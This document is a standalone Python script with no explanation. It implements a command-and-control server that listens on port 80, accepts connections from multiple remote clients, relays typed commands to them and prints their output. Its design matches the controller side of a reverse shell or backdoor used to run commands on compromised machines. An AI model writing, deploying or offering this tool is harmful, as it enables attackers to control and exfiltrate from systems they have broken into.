import socket
import threading
import queue
import os

host = "0.0.0.0"
port = 80

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(5)
print(f"[*] Listening on {host}:{port}")

command_queue = queue.Queue()
clients = []

def handler(client):
    while True:
        try:
            if not command_queue.empty():
                command = command_queue.get()
                client.send(command.encode("utf-8"))
                response = client.recv(4096).decode("utf-8")
                print(f"\nResponse from {client.getpeername()}:\n{response}")
        except (ConnectionResetError, BrokenPipeError):
            print(f"[-] Client disconnected")
            clients.remove(client)
            client.close()
            break

def command_input():
    while True:
        cmd = input("\nEnter command (or 'exit' to quit): ")
        if cmd.lower() == 'exit':
            for c in clients:
                c.close()
            server.close()
            os._exit(0)
        command_queue.put(cmd)

# Start command input thread
threading.Thread(target=command_input, daemon=True).start()

while True:
    client, addr = server.accept()
    print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
    clients.append(client)
    client_thread = threading.Thread(target=handler, args=(client,))
    client_thread.daemon = True
    client_thread.start()
